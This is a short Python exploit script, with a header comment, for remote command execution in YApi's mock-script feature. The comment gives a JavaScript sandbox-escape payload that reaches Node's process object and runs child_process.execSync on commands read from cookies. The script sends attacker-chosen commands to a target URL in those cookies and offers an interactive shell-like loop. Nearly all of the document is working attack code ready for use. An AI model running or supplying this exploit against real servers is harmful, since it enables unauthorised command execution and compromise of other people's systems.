# Author: Esonhugh
# Date: 2022/5/14
# MockScript Came from: https://github.com/YMFE/yapi/issues/2099
# MockJson = 
# const sandbox = this
# const ObjectConstructor = this.constructor
# const FunctionConstructor = ObjectConstructor.constructor
# const myfun = FunctionConstructor('return process')
# const process = myfun()
# mockJson = process.mainModule.require("child_process").execSync("cd "+cookie.dir+";"+cookie.cmd).toString()

import requests
import sys

targeturl = ""
targetdir = "."
targetcmd = ""

def main():
    bad_cookie = {
            "dir": targetdir,
            "cmd": targetcmd,
            }
    print(bad_cookie)
    r = requests.get(targeturl,cookies=bad_cookie)
    print(r.text)

if __name__ == '__main__':
    targeturl = sys.argv[1]
    targetdir = sys.argv[2]
    if targetdir == "-i":
        while True:
            targetcmd = input("Command:")
            if targetcmd.split(" ")[0] == "cd":
                targetdir = targetcmd[2:]
            main()
    else:
        targetcmd = " ".join(sys.argv[3:])
        main()
